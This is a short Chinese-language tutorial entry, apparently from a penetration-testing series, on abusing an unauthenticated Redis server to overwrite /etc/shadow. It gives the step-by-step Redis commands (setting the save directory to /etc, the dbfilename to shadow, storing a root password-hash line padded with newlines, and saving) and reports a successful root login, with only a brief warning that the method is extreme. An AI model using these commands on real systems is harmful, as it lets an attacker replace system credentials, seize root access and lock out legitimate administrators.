666.redis写shadow

redis写shadow作为极端操作不建议大家在渗透中去用，尽管是实验我们还是先备份shadow文件，以防登录不上。

mv /etc/shadow /etc/shadow.bak

然后我们复制当前shadow的相应值

root:$6$ZPEUqn3oQNFJNomM$5WKlngU6M9dP2i2CPhVxA7.0b0zo60u4blq.Uaf.xTVOyXP3H/.W00/MROiiuGlKTaNrV1O3iKnKD7IDfVLoh.:18373:0:99999:7:::

我们删除shadow后就无法登录了


然后开始用redis写shadow。
config set dir /etcconfig set dbfilename shadowset xx "\n\nroot:$6$ZPEUqn3oQNFJNomM$5WKlngU6M9dP2i2CPhVxA7.0b0zo60u4blq.Uaf.xTVOyXP3H/.W00/MROiiuGlKTaNrV1O3iKnKD7IDfVLoh.:18373:0:99999:7:::\n\n"save

因为redis在写入文件的时候会加上一些自带的字符串，所以前后都加上换行。

我们再次尝试登录，登录成功
